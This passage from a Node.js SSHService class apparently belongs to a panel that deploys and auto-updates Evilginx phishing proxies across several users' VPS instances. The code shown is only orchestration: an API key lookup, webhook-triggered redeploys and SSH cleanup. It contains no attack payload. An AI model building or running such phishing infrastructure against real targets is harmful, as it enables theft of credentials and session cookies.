        const apiKey = result.stdout.trim();
        if (!apiKey) {
            throw new Error('API key not found. Evilginx may not be deployed or running yet.');
        }
        
        return apiKey;
    }

    // =====================================================
    // UPDATE OPERATIONS
    // =====================================================

    async update(vpsId, deploymentId) {
        // This is essentially a re-deploy with git pull
        return this.deploy(vpsId, deploymentId);
    }

    async updateAllVPS() {
        // Get all deployed VPS instances
        const result = await this.pool.query(
            'SELECT id, user_id FROM vps_instances WHERE is_deployed = 1'
        );

        const updates = [];
        for (const vps of result.rows) {
            try {
                const deployId = crypto.randomBytes(16).toString('hex');
                
                // Create deployment record
                await this.pool.query(`
                    INSERT INTO deployments (id, vps_id, user_id, type, triggered_by)
                    VALUES (?, ?, ?, 'update', 'webhook')
                `, [deployId, vps.id, vps.user_id]);
                
                // Start deployment (non-blocking)
                this.deploy(vps.id, deployId).catch(err => {
                    console.error(`Auto-update failed for VPS ${vps.id}:`, err);
                });

                updates.push({ vps_id: vps.id, deployment_id: deployId });
            } catch (error) {
                console.error(`Failed to initiate update for VPS ${vps.id}:`, error);
            }
        }

        return updates;
    }

    // =====================================================
    // CLEANUP
    // =====================================================

    disconnect(vpsId) {
        if (this.connections.has(vpsId)) {
            const { conn } = this.connections.get(vpsId);
            if (conn) conn.end();
            this.connections.delete(vpsId);
        }
    }

    disconnectAll() {
        for (const [id, { conn }] of this.connections) {
            if (conn) conn.end();
        }
        this.connections.clear();
    }
}

module.exports = SSHService;
